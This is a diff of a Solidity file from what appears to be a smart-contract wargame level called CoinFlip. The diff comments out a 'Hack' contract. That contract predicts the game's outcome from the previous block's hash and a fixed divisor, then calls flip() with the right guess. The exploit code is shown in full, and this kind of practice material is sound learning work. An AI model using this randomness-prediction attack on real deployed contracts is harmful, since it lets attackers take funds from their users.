@@ -31,13 +31,13 @@ contract CoinFlip {
   }
 }
 
-contract Hack {
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+// contract Hack {
+//   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-  function hack(CoinFlip _flip) external {
-    uint256 blockValue = uint256(blockhash(block.number - 1));
-    uint256 coinFlip = blockValue.div(FACTOR);
-    bool side = coinFlip == 1 ? true : false;
-    _flip.flip(side);
-  }
-}
+//   function hack(CoinFlip _flip) external {
+//     uint256 blockValue = uint256(blockhash(block.number - 1));
+//     uint256 coinFlip = blockValue.div(FACTOR);
+//     bool side = coinFlip == 1 ? true : false;
+//     _flip.flip(side);
+//   }
+// }
